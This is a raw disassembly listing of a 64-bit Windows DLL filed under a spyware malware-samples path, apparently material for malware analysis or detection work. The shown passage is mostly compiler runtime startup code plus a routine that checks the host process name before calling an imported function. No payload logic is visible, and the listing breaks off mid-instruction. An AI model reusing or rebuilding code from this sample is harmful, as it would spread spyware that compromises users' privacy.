
malware_samples/spyware/2b0752e6b09baa49998e919f75407ec76d6d52cc6a3fc9aa9941fc480501afad.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
   180001007:	48 8b 05 f2 8f 01 00 	mov    0x18ff2(%rip),%rax        # 0x18001a000
   18000100e:	48 33 c4             	xor    %rsp,%rax
   180001011:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   180001018:	00 
   180001019:	83 fa 01             	cmp    $0x1,%edx
   18000101c:	75 7d                	jne    0x18000109b
   18000101e:	ff 15 dc df 00 00    	call   *0xdfdc(%rip)        # 0x18000f000
   180001024:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000102a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000102f:	33 c9                	xor    %ecx,%ecx
   180001031:	ff 15 d1 df 00 00    	call   *0xdfd1(%rip)        # 0x18000f008
   180001037:	85 c0                	test   %eax,%eax
   180001039:	74 31                	je     0x18000106c
   18000103b:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180001040:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001045:	e8 56 0e 00 00       	call   0x180001ea0
   18000104a:	48 85 c0             	test   %rax,%rax
   18000104d:	74 05                	je     0x180001054
   18000104f:	48 ff c0             	inc    %rax
   180001052:	eb 05                	jmp    0x180001059
   180001054:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   180001059:	48 8d 15 90 e2 00 00 	lea    0xe290(%rip),%rdx        # 0x18000f2f0
   180001060:	48 8b c8             	mov    %rax,%rcx
   180001063:	e8 c8 39 00 00       	call   0x180004a30
   180001068:	85 c0                	test   %eax,%eax
   18000106a:	75 2f                	jne    0x18000109b
   18000106c:	48 8d 0d 8d e2 00 00 	lea    0xe28d(%rip),%rcx        # 0x18000f300
   180001073:	ff 15 97 df 00 00    	call   *0xdf97(%rip)        # 0x18000f010
   180001079:	33 c9                	xor    %ecx,%ecx
   18000107b:	48 85 c0             	test   %rax,%rax
   18000107e:	0f 95 c1             	setne  %cl
   180001081:	8b c1                	mov    %ecx,%eax
   180001083:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   18000108a:	00 
   18000108b:	48 33 cc             	xor    %rsp,%rcx
   18000108e:	e8 3d 02 00 00       	call   0x1800012d0
   180001093:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   18000109a:	c3                   	ret
   18000109b:	b8 01 00 00 00       	mov    $0x1,%eax
   1800010a0:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1800010a7:	00 
   1800010a8:	48 33 cc             	xor    %rsp,%rcx
   1800010ab:	e8 20 02 00 00       	call   0x1800012d0
   1800010b0:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
   1800010b7:	c3                   	ret
   1800010b8:	cc                   	int3
   1800010b9:	cc                   	int3
   1800010ba:	cc                   	int3
   1800010bb:	cc                   	int3
   1800010bc:	cc                   	int3
   1800010bd:	cc                   	int3
   1800010be:	cc                   	int3
   1800010bf:	cc                   	int3
   1800010c0:	b9 02 00 00 00       	mov    $0x2,%ecx
   1800010c5:	cd 29                	int    $0x29
   1800010c7:	c3                   	ret
   1800010c8:	cc                   	int3
   1800010c9:	cc                   	int3
   1800010ca:	cc                   	int3
   1800010cb:	cc                   	int3
   1800010cc:	cc                   	int3
   1800010cd:	cc                   	int3
   1800010ce:	cc                   	int3
   1800010cf:	cc                   	int3
   1800010d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800010d4:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1800010d8:	48 8b ca             	mov    %rdx,%rcx
   1800010db:	49 8b d1             	mov    %r9,%rdx
   1800010de:	e8 0d 00 00 00       	call   0x1800010f0
   1800010e3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800010e8:	48 83 c4 28          	add    $0x28,%rsp
   1800010ec:	c3                   	ret
   1800010ed:	cc                   	int3
   1800010ee:	cc                   	int3
   1800010ef:	cc                   	int3
   1800010f0:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800010f5:	57                   	push   %rdi
   1800010f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800010fa:	49 63 30             	movslq (%r8),%rsi
   1800010fd:	48 8b f9             	mov    %rcx,%rdi
   180001100:	40 f6 c6 04          	test   $0x4,%sil
   180001104:	74 15                	je     0x18000111b
   180001106:	41 8b 40 08          	mov    0x8(%r8),%eax
   18000110a:	4d 63 50 04          	movslq 0x4(%r8),%r10
   18000110e:	f7 d8                	neg    %eax
   180001110:	4c 63 c0             	movslq %eax,%r8
   180001113:	4c 03 d1             	add    %rcx,%r10
   180001116:	4d 23 d0             	and    %r8,%r10
   180001119:	eb 03                	jmp    0x18000111e
   18000111b:	4c 8b d7             	mov    %rdi,%r10
   18000111e:	48 8b 42 10          	mov    0x10(%rdx),%rax
   180001122:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180001127:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   18000112c:	44 8b 40 08          	mov    0x8(%rax),%r8d
   180001130:	4c 03 42 08          	add    0x8(%rdx),%r8
   180001134:	41 0f b6 00          	movzbl (%r8),%eax
   180001138:	41 0f b6 48 03       	movzbl 0x3(%r8),%ecx
   18000113d:	24 07                	and    $0x7,%al
   18000113f:	3c 03                	cmp    $0x3,%al
   180001141:	73 0d                	jae    0x180001150
   180001143:	f6 c1 0f             	test   $0xf,%cl
   180001146:	74 13                	je     0x18000115b
   180001148:	44 8b c9             	mov    %ecx,%r9d
   18000114b:	e9 fd 00 00 00       	jmp    0x18000124d
   180001150:	44 8b d9             	mov    %ecx,%r11d
   180001153:	8b d1                	mov    %ecx,%edx
   180001155:	41 83 e3 1f          	and    $0x1f,%r11d
   180001159:	75 08                	jne    0x180001163
   18000115b:	45 33 c9             	xor    %r9d,%r9d
   18000115e:	e9 ee 00 00 00       	jmp    0x180001251
   180001163:	49 83 c0 04          	add    $0x4,%r8
   180001167:	41 8b c3             	mov    %r11d,%eax
   18000116a:	45 33 c9             	xor    %r9d,%r9d
   18000116d:	c1 ea 05             	shr    $0x5,%edx
   180001170:	4c 03 c0             	add    %rax,%r8
   180001173:	41 8b c9             	mov    %r9d,%ecx
   180001176:	85 d2                	test   %edx,%edx
   180001178:	74 22                	je     0x18000119c
   18000117a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001180:	41 0f b6 00          	movzbl (%r8),%eax
   180001184:	49 83 c0 03          	add    $0x3,%r8
   180001188:	c1 e8 03             	shr    $0x3,%eax
   18000118b:	85 c0                	test   %eax,%eax
   18000118d:	74 07                	je     0x180001196
   18000118f:	49 83 c0 03          	add    $0x3,%r8
   180001193:	4c 03 c0             	add    %rax,%r8
   180001196:	ff c1                	inc    %ecx
   180001198:	3b ca                	cmp    %edx,%ecx
   18000119a:	72 e4                	jb     0x180001180
   18000119c:	41 8b d9             	mov    %r9d,%ebx
   18000119f:	45 85 db             	test   %r11d,%r11d
   1800011a2:	0f 84 a9 00 00 00    	je     0x180001251
   1800011a8:	48 8d 2d 51 ee ff ff 	lea    -0x11af(%rip),%rbp        # 0x180000000
   1800011af:	90                   	nop
   1800011b0:	41 0f b6 00          	movzbl (%r8),%eax
   1800011b4:	0f b6 d0             	movzbl %al,%edx
   1800011b7:	3c 03                	cmp    $0x3,%al
   1800011b9:	76 19                	jbe    0x1800011d4
   1800011bb:	80 e2 0f             	and    $0xf,%dl
   1800011be:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   1800011c1:	80 f9 02             	cmp    $0x2,%cl
   1800011c4:	76 0e                	jbe    0x1800011d4
   1800011c6:	0f b6 d0             	movzbl %al,%edx
   1800011c9:	80 e2 07             	and    $0x7,%dl
   1800011cc:	8d 4a fc             	lea    -0x4(%rdx),%ecx
   1800011cf:	80 f9 03             	cmp    $0x3,%cl
   1800011d2:	77 24                	ja     0x1800011f8
   1800011d4:	84 d2                	test   %dl,%dl
   1800011d6:	74 70                	je     0x180001248
   1800011d8:	3c 03                	cmp    $0x3,%al
   1800011da:	76 2b                	jbe    0x180001207
   1800011dc:	0f b6 d0             	movzbl %al,%edx
   1800011df:	80 e2 0f             	and    $0xf,%dl
   1800011e2:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   1800011e5:	80 f9 02             	cmp    $0x2,%cl
   1800011e8:	76 16                	jbe    0x180001200
   1800011ea:	0f b6 d0             	movzbl %al,%edx
   1800011ed:	80 e2 07             	and    $0x7,%dl
   1800011f0:	8d 4a fc             	lea    -0x4(%rdx),%ecx
   1800011f3:	80 f9 03             	cmp    $0x3,%cl
   1800011f6:	76 08                	jbe    0x180001200
   1800011f8:	24 3f                	and    $0x3f,%al
   1800011fa:	3c 20                	cmp    $0x20,%al
   1800011fc:	75 7b                	jne    0x180001279
   1800011fe:	eb 07                	jmp    0x180001207
   180001200:	0f b6 c2             	movzbl %dl,%eax
   180001203:	3c 20                	cmp    $0x20,%al
   180001205:	77 72                	ja     0x180001279
   180001207:	0f b6 c0             	movzbl %al,%eax
   18000120a:	0f b6 84 28 94 12 00 	movzbl 0x1294(%rax,%rbp,1),%eax
   180001211:	00 
   180001212:	8b 8c 85 80 12 00 00 	mov    0x1280(%rbp,%rax,4),%ecx
   180001219:	48 03 cd             	add    %rbp,%rcx
   18000121c:	ff e1                	jmp    *%rcx
   18000121e:	b8 01 00 00 00       	mov    $0x1,%eax
   180001223:	eb 13                	jmp    0x180001238
   180001225:	b8 02 00 00 00       	mov    $0x2,%eax
   18000122a:	eb 0c                	jmp    0x180001238
   18000122c:	b8 03 00 00 00       	mov    $0x3,%eax
   180001231:	eb 05                	jmp    0x180001238
   180001233:	b8 05 00 00 00       	mov    $0x5,%eax
   180001238:	4c 03 c0             	add    %rax,%r8
   18000123b:	ff c3                	inc    %ebx
   18000123d:	41 3b db             	cmp    %r11d,%ebx
   180001240:	0f 82 6a ff ff ff    	jb     0x1800011b0
   180001246:	eb 09                	jmp    0x180001251
   180001248:	45 0f b6 48 01       	movzbl 0x1(%r8),%r9d
   18000124d:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   180001251:	49 8d 0c 39          	lea    (%r9,%rdi,1),%rcx
   180001255:	48 8b c6             	mov    %rsi,%rax
   180001258:	48 83 e0 f8          	and    $0xfffffffffffffff8,%rax
   18000125c:	4a 33 0c 10          	xor    (%rax,%r10,1),%rcx
   180001260:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001265:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000126a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000126f:	48 83 c4 20          	add    $0x20,%rsp
   180001273:	5f                   	pop    %rdi
   180001274:	e9 57 00 00 00       	jmp    0x1800012d0
   180001279:	e8 42 fe ff ff       	call   0x1800010c0
   18000127e:	cc                   	int3
   18000127f:	90                   	nop
   180001280:	25 12 00 00 33       	and    $0x33000012,%eax
   180001285:	12 00                	adc    (%rax),%al
   180001287:	00 2c 12             	add    %ch,(%rdx,%rdx,1)
   18000128a:	00 00                	add    %al,(%rax)
   18000128c:	1e                   	(bad)
   18000128d:	12 00                	adc    (%rax),%al
   18000128f:	00 79 12             	add    %bh,0x12(%rcx)
   180001292:	00 00                	add    %al,(%rax)
   180001294:	00 01                	add    %al,(%rcx)
   180001296:	02 00                	add    (%rax),%al
   180001298:	03 01                	add    (%rcx),%eax
   18000129a:	02 03                	add    (%rbx),%al
   18000129c:	03 01                	add    (%rcx),%eax
   18000129e:	02 04 04             	add    (%rsp,%rax,1),%al
   1800012a1:	04 04                	add    $0x4,%al
   1800012a3:	04 04                	add    $0x4,%al
   1800012a5:	04 04                	add    $0x4,%al
   1800012a7:	04 04                	add    $0x4,%al
   1800012a9:	04 04                	add    $0x4,%al
   1800012ab:	04 04                	add    $0x4,%al
   1800012ad:	04 04                	add    $0x4,%al
   1800012af:	04 04                	add    $0x4,%al
   1800012b1:	04 04                	add    $0x4,%al
   1800012b3:	04 00                	add    $0x0,%al
   1800012b5:	cc                   	int3
   1800012b6:	cc                   	int3
   1800012b7:	cc                   	int3
   1800012b8:	cc                   	int3
   1800012b9:	cc                   	int3
   1800012ba:	cc                   	int3
   1800012bb:	cc                   	int3
   1800012bc:	cc                   	int3
   1800012bd:	cc                   	int3
   1800012be:	cc                   	int3
   1800012bf:	cc                   	int3
   1800012c0:	cc                   	int3
   1800012c1:	cc                   	int3
   1800012c2:	cc                   	int3
   1800012c3:	cc                   	int3
   1800012c4:	cc                   	int3
   1800012c5:	cc                   	int3
   1800012c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800012cd:	00 00 00 
   1800012d0:	48 3b 0d 29 8d 01 00 	cmp    0x18d29(%rip),%rcx        # 0x18001a000
   1800012d7:	75 10                	jne    0x1800012e9
   1800012d9:	48 c1 c1 10          	rol    $0x10,%rcx
   1800012dd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1800012e2:	75 01                	jne    0x1800012e5
   1800012e4:	c3                   	ret
   1800012e5:	48 c1 c9 10          	ror    $0x10,%rcx
   1800012e9:	e9 d2 fd ff ff       	jmp    0x1800010c0
   1800012ee:	cc                   	int3
   1800012ef:	cc                   	int3
   1800012f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800012f4:	85 d2                	test   %edx,%edx
   1800012f6:	74 3f                	je     0x180001337
   1800012f8:	83 ea 01             	sub    $0x1,%edx
   1800012fb:	74 2e                	je     0x18000132b
   1800012fd:	83 ea 01             	sub    $0x1,%edx
   180001300:	74 1c                	je     0x18000131e
   180001302:	83 fa 01             	cmp    $0x1,%edx
   180001305:	74 0a                	je     0x180001311
   180001307:	b8 01 00 00 00       	mov    $0x1,%eax
   18000130c:	48 83 c4 28          	add    $0x28,%rsp
   180001310:	c3                   	ret
   180001311:	e8 ca 05 00 00       	call   0x1800018e0
   180001316:	0f b6 c0             	movzbl %al,%eax
   180001319:	48 83 c4 28          	add    $0x28,%rsp
   18000131d:	c3                   	ret
   18000131e:	e8 8d 05 00 00       	call   0x1800018b0
   180001323:	0f b6 c0             	movzbl %al,%eax
   180001326:	48 83 c4 28          	add    $0x28,%rsp
   18000132a:	c3                   	ret
   18000132b:	49 8b d0             	mov    %r8,%rdx
   18000132e:	48 83 c4 28          	add    $0x28,%rsp
   180001332:	e9 19 00 00 00       	jmp    0x180001350
   180001337:	4d 85 c0             	test   %r8,%r8
   18000133a:	0f 95 c1             	setne  %cl
   18000133d:	48 83 c4 28          	add    $0x28,%rsp
   180001341:	e9 1a 01 00 00       	jmp    0x180001460
   180001346:	cc                   	int3
   180001347:	cc                   	int3
   180001348:	cc                   	int3
   180001349:	cc                   	int3
   18000134a:	cc                   	int3
   18000134b:	cc                   	int3
   18000134c:	cc                   	int3
   18000134d:	cc                   	int3
   18000134e:	cc                   	int3
   18000134f:	cc                   	int3
   180001350:	40 53                	rex push %rbx
   180001352:	56                   	push   %rsi
   180001353:	57                   	push   %rdi
   180001354:	41 56                	push   %r14
   180001356:	48 83 ec 28          	sub    $0x28,%rsp
   18000135a:	48 8b f2             	mov    %rdx,%rsi
   18000135d:	4c 8b f1             	mov    %rcx,%r14
   180001360:	33 c9                	xor    %ecx,%ecx
   180001362:	e8 49 06 00 00       	call   0x1800019b0
   180001367:	84 c0                	test   %al,%al
   180001369:	0f 84 ce 00 00 00    	je     0x18000143d
   18000136f:	e8 2c 04 00 00       	call   0x1800017a0
   180001374:	0f b6 d8             	movzbl %al,%ebx
   180001377:	88 44 24 60          	mov    %al,0x60(%rsp)
   18000137b:	40 b7 01             	mov    $0x1,%dil
   18000137e:	83 3d 3b 97 01 00 00 	cmpl   $0x0,0x1973b(%rip)        # 0x18001aac0
   180001385:	0f 85 be 00 00 00    	jne    0x180001449
   18000138b:	c7 05 2b 97 01 00 01 	movl   $0x1,0x1972b(%rip)        # 0x18001aac0
   180001392:	00 00 00 
   180001395:	e8 96 04 00 00       	call   0x180001830
   18000139a:	84 c0                	test   %al,%al
   18000139c:	74 4f                	je     0x1800013ed
   18000139e:	e8 7d 07 00 00       	call   0x180001b20
   1800013a3:	e8 98 03 00 00       	call   0x180001740
   1800013a8:	e8 d3 03 00 00       	call   0x180001780
   1800013ad:	48 8d 15 fc de 00 00 	lea    0xdefc(%rip),%rdx        # 0x18000f2b0
   1800013b4:	48 8d 0d d5 de 00 00 	lea    0xded5(%rip),%rcx        # 0x18000f290
   1800013bb:	e8 38 38 00 00       	call   0x180004bf8
   1800013c0:	85 c0                	test   %eax,%eax
   1800013c2:	75 29                	jne    0x1800013ed
   1800013c4:	e8 27 04 00 00       	call   0x1800017f0
   1800013c9:	84 c0                	test   %al,%al
   1800013cb:	74 20                	je     0x1800013ed
   1800013cd:	48 8d 15 b4 de 00 00 	lea    0xdeb4(%rip),%rdx        # 0x18000f288
   1800013d4:	48 8d 0d a5 de 00 00 	lea    0xdea5(%rip),%rcx        # 0x18000f280
   1800013db:	e8 e0 37 00 00       	call   0x180004bc0
   1800013e0:	c7 05 d6 96 01 00 02 	movl   $0x2,0x196d6(%rip)        # 0x18001aac0
   1800013e7:	00 00 00 
   1800013ea:	40 32 ff             	xor    %dil,%dil
   1800013ed:	0f b6 cb             	movzbl %bl,%ecx
   1800013f0:	e8 9b 06 00 00       	call   0x180001a90
   1800013f5:	40 84 ff             	test   %dil,%dil
   1800013f8:	75 43                	jne    0x18000143d
   1800013fa:	e8 f1 06 00 00       	call   0x180001af0
   1800013ff:	48 8b d8             	mov    %rax,%rbx
   180001402:	48 83 38 00          	cmpq   $0x0,(%rax)
   180001406:	74 20                	je     0x180001428
   180001408:	48 8b c8             	mov    %rax,%rcx
   18000140b:	e8 e0 05 00 00       	call   0x1800019f0
   180001410:	84 c0                	test   %al,%al
   180001412:	74 14                	je     0x180001428
   180001414:	4c 8b c6             	mov    %rsi,%r8
   180001417:	ba 02 00 00 00       	mov    $0x2,%edx
   18000141c:	49 8b ce             	mov    %r14,%rcx
   18000141f:	48 8b 03             	mov    (%rbx),%rax
   180001422:	ff 15 30 de 00 00    	call   *0xde30(%rip)        # 0x18000f258
   180001428:	ff 05 62 96 01 00    	incl   0x19662(%rip)        # 0x18001aa90
   18000142e:	b8 01 00 00 00       	mov    $0x1,%eax
   180001433:	48 83 c4 28          	add    $0x28,%rsp
   180001437:	41 5e                	pop    %r14
   180001439:	5f                   	pop    %rdi
   18000143a:	5e                   	pop    %rsi
   18000143b:	5b                   	pop    %rbx
   18000143c:	c3                   	ret
   18000143d:	33 c0                	xor    %eax,%eax
   18000143f:	48 83 c4 28          	add    $0x28,%rsp
   180001443:	41 5e                	pop    %r14
   180001445:	5f                   	pop    %rdi
   180001446:	5e                   	pop    %rsi
   180001447:	5b                   	pop    %rbx
   180001448:	c3                   	ret
   180001449:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000144e:	e8 bd 06 00 00       	call   0x180001b10
   180001453:	90                   	nop
   180001454:	cc                   	int3
   180001455:	cc                   	int3
   180001456:	cc                   	int3
   180001457:	cc                   	int3
   180001458:	cc                   	int3
   180001459:	cc                   	int3
   18000145a:	cc                   	int3
   18000145b:	cc                   	int3
   18000145c:	cc                   	int3
   18000145d:	cc                   	int3
   18000145e:	cc                   	int3
   18000145f:	cc                   	int3
   180001460:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001465:	57                   	push   %rdi
   180001466:	48 83 ec 30          	sub    $0x30,%rsp
   18000146a:	0f b6 f9             	movzbl %cl,%edi
   18000146d:	8b 05 1d 96 01 00    	mov    0x1961d(%rip),%eax        # 0x18001aa90
   180001473:	85 c0                	test   %eax,%eax
   180001475:	7f 0d                	jg     0x180001484
   180001477:	33 c0                	xor    %eax,%eax
   180001479:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000147e:	48 83 c4 30          	add    $0x30,%rsp
   180001482:	5f                   	pop    %rdi
   180001483:	c3                   	ret
   180001484:	ff c8                	dec    %eax
   180001486:	89 05 04 96 01 00    	mov    %eax,0x19604(%rip)        # 0x18001aa90
   18000148c:	e8 0f 03 00 00       	call   0x1800017a0
   180001491:	0f b6 d8             	movzbl %al,%ebx
   180001494:	88 44 24 20          	mov    %al,0x20(%rsp)
   180001498:	83 3d 21 96 01 00 02 	cmpl   $0x2,0x19621(%rip)        # 0x18001aac0
   18000149f:	75 4c                	jne    0x1800014ed
   1800014a1:	e8 aa 04 00 00       	call   0x180001950
   1800014a6:	e8 a5 02 00 00       	call   0x180001750
   1800014ab:	e8 c0 06 00 00       	call   0x180001b70
   1800014b0:	c7 05 06 96 01 00 00 	movl   $0x0,0x19606(%rip)        # 0x18001aac0
   1800014b7:	00 00 00 
   1800014ba:	0f b6 cb             	movzbl %bl,%ecx
   1800014bd:	e8 ce 05 00 00       	call   0x180001a90
   1800014c2:	33 d2                	xor    %edx,%edx
   1800014c4:	40 0f b6 cf          	movzbl %dil,%ecx
   1800014c8:	e8 f3 05 00 00       	call   0x180001ac0
   1800014cd:	0f b6 d8             	movzbl %al,%ebx
   1800014d0:	e8 bb 04 00 00       	call   0x180001990
   1800014d5:	8b c3                	mov    %ebx,%eax
   1800014d7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800014dc:	48 83 c4 30          	add    $0x30,%rsp
   1800014e0:	5f                   	pop    %rdi
   1800014e1:	c3                   	ret
   1800014e2:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800014e7:	48 83 c4 30          	add    $0x30,%rsp
   1800014eb:	5f                   	pop    %rdi
   1800014ec:	c3                   	ret
   1800014ed:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800014f2:	e8 19 06 00 00       	call   0x180001b10
   1800014f7:	90                   	nop
   1800014f8:	90                   	nop
   1800014f9:	cc                   	int3
   1800014fa:	cc                   	int3
   1800014fb:	cc                   	int3
   1800014fc:	cc                   	int3
   1800014fd:	cc                   	int3
   1800014fe:	cc                   	int3
   1800014ff:	cc                   	int3
   180001500:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001505:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000150a:	89 54 24 10          	mov    %edx,0x10(%rsp)
   18000150e:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001513:	56                   	push   %rsi
   180001514:	57                   	push   %rdi
   180001515:	41 56                	push   %r14
   180001517:	48 83 ec 40          	sub    $0x40,%rsp
   18000151b:	49 8b f0             	mov    %r8,%rsi
   18000151e:	8b fa                	mov    %edx,%edi
   180001520:	4c 8b f1             	mov    %rcx,%r14
   180001523:	85 d2                	test   %edx,%edx
   180001525:	75 18                	jne    0x18000153f
   180001527:	39 15 63 95 01 00    	cmp    %edx,0x19563(%rip)        # 0x18001aa90
   18000152d:	7f 10                	jg     0x18000153f
   18000152f:	33 c0                	xor    %eax,%eax
   180001531:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180001536:	48 83 c4 40          	add    $0x40,%rsp
   18000153a:	41 5e                	pop    %r14
   18000153c:	5f                   	pop    %rdi
   18000153d:	5e                   	pop    %rsi
   18000153e:	c3                   	ret
   18000153f:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180001542:	83 f8 01             	cmp    $0x1,%eax
   180001545:	77 42                	ja     0x180001589
   180001547:	48 8b 05 c2 dd 00 00 	mov    0xddc2(%rip),%rax        # 0x18000f310
   18000154e:	48 85 c0             	test   %rax,%rax
   180001551:	75 07                	jne    0x18000155a
   180001553:	bb 01 00 00 00       	mov    $0x1,%ebx
   180001558:	eb 08                	jmp    0x180001562
   18000155a:	ff 15 f8 dc 00 00    	call   *0xdcf8(%rip)        # 0x18000f258
   180001560:	8b d8                	mov    %eax,%ebx
   180001562:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001566:	85 db                	test   %ebx,%ebx
   180001568:	0f 84 b0 00 00 00    	je     0x18000161e
   18000156e:	4c 8b c6             	mov    %rsi,%r8
   180001571:	8b d7                	mov    %edi,%edx
   180001573:	49 8b ce             	mov    %r14,%rcx
   180001576:	e8 75 fd ff ff       	call   0x1800012f0
   18000157b:	8b d8                	mov    %eax,%ebx
   18000157d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001581:	85 c0                	test   %eax,%eax
   180001583:	0f 84 95 00 00 00    	je     0x18000161e
   180001589:	4c 8b c6             	mov    %rsi,%r8
   18000158c:	8b d7                	mov    %edi,%edx
   18000158e:	49 8b ce             	mov    %r14,%rcx
   180001591:	e8 6a fa ff ff       	call   0x180001000
   180001596:	8b d8                	mov    %eax,%ebx
   180001598:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000159c:	83 ff 01             	cmp    $0x1,%edi
   18000159f:	75 36                	jne    0x1800015d7
   1800015a1:	85 c0                	test   %eax,%eax
   1800015a3:	75 32                	jne    0x1800015d7
   1800015a5:	4c 8b c6             	mov    %rsi,%r8
   1800015a8:	33 d2                	xor    %edx,%edx
   1800015aa:	49 8b ce             	mov    %r14,%rcx
   1800015ad:	e8 4e fa ff ff       	call   0x180001000
   1800015b2:	48 85 f6             	test   %rsi,%rsi
   1800015b5:	0f 95 c1             	setne  %cl
   1800015b8:	e8 a3 fe ff ff       	call   0x180001460
   1800015bd:	48 8b 05 4c dd 00 00 	mov    0xdd4c(%rip),%rax        # 0x18000f310
   1800015c4:	48 85 c0             	test   %rax,%rax
   1800015c7:	74 0e                	je     0x1800015d7
   1800015c9:	4c 8b c6             	mov    %rsi,%r8
   1800015cc:	33 d2                	xor    %edx,%edx
   1800015ce:	49 8b ce             	mov    %r14,%rcx
   1800015d1:	ff 15 81 dc 00 00    	call   *0xdc81(%rip)        # 0x18000f258
   1800015d7:	85 ff                	test   %edi,%edi
   1800015d9:	74 05                	je     0x1800015e0
   1800015db:	83 ff 03             	cmp    $0x3,%edi
   1800015de:	75 3e                	jne    0x18000161e
   1800015e0:	4c 8b c6             	mov    %rsi,%r8
   1800015e3:	8b d7                	mov    %edi,%edx
   1800015e5:	49 8b ce             	mov    %r14,%rcx
   1800015e8:	e8 03 fd ff ff       	call   0x1800012f0
   1800015ed:	8b d8                	mov    %eax,%ebx
   1800015ef:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800015f3:	85 c0                	test   %eax,%eax
   1800015f5:	74 27                	je     0x18000161e
   1800015f7:	48 8b 05 12 dd 00 00 	mov    0xdd12(%rip),%rax        # 0x18000f310
   1800015fe:	48 85 c0             	test   %rax,%rax
   180001601:	75 07                	jne    0x18000160a
   180001603:	bb 01 00 00 00       	mov    $0x1,%ebx
   180001608:	eb 10                	jmp    0x18000161a
   18000160a:	4c 8b c6             	mov    %rsi,%r8
   18000160d:	8b d7                	mov    %edi,%edx
   18000160f:	49 8b ce             	mov    %r14,%rcx
   180001612:	ff 15 40 dc 00 00    	call   *0xdc40(%rip)        # 0x18000f258
   180001618:	8b d8                	mov    %eax,%ebx
   18000161a:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   18000161e:	eb 06                	jmp    0x180001626
   180001620:	33 db                	xor    %ebx,%ebx
   180001622:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180001626:	8b c3                	mov    %ebx,%eax
   180001628:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   18000162d:	48 83 c4 40          	add    $0x40,%rsp
   180001631:	41 5e                	pop    %r14
   180001633:	5f                   	pop    %rdi
   180001634:	5e                   	pop    %rsi
   180001635:	c3                   	ret
   180001636:	cc                   	int3
   180001637:	cc                   	int3
   180001638:	cc                   	int3
   180001639:	cc                   	int3
   18000163a:	cc                   	int3
   18000163b:	cc                   	int3
   18000163c:	cc                   	int3
   18000163d:	cc                   	int3
   18000163e:	cc                   	int3
   18000163f:	cc                   	int3
   180001640:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001645:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000164a:	57                   	push   %rdi
   18000164b:	48 83 ec 20          	sub    $0x20,%rsp
   18000164f:	49 8b f8             	mov    %r8,%rdi
   180001652:	8b da                	mov    %edx,%ebx
   180001654:	48 8b f1             	mov    %rcx,%rsi
   180001657:	83 fa 01             	cmp    $0x1,%edx
   18000165a:	75 05                	jne    0x180001661
   18000165c:	e8 1f 00 00 00       	call   0x180001680
   180001661:	4c 8b c7             	mov    %rdi,%r8
   180001664:	8b d3                	mov    %ebx,%edx
   180001666:	48 8b ce             	mov    %rsi,%rcx
   180001669:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000166e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001673:	48 83 c4 20          	add    $0x20,%rsp
   180001677:	5f                   	pop    %rdi
   180001678:	e9 83 fe ff ff       	jmp    0x180001500
   18000167d:	cc                   	int3
   18000167e:	cc                   	int3
   18000167f:	cc                   	int3
   180001680:	40 53                	rex push %rbx
   180001682:	48 83 ec 30          	sub    $0x30,%rsp
   180001686:	48 8b 05 73 89 01 00 	mov    0x18973(%rip),%rax        # 0x18001a000
   18000168d:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180001694:	2b 00 00 
   180001697:	48 3b c3             	cmp    %rbx,%rax
   18000169a:	74 10                	je     0x1800016ac
   18000169c:	48 f7 d0             	not    %rax
   18000169f:	48 89 05 9a 89 01 00 	mov    %rax,0x1899a(%rip)        # 0x18001a040
   1800016a6:	48 83 c4 30          	add    $0x30,%rsp
   1800016aa:	5b                   	pop    %rbx
   1800016ab:	c3                   	ret
   1800016ac:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800016b1:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   1800016b8:	00 00 
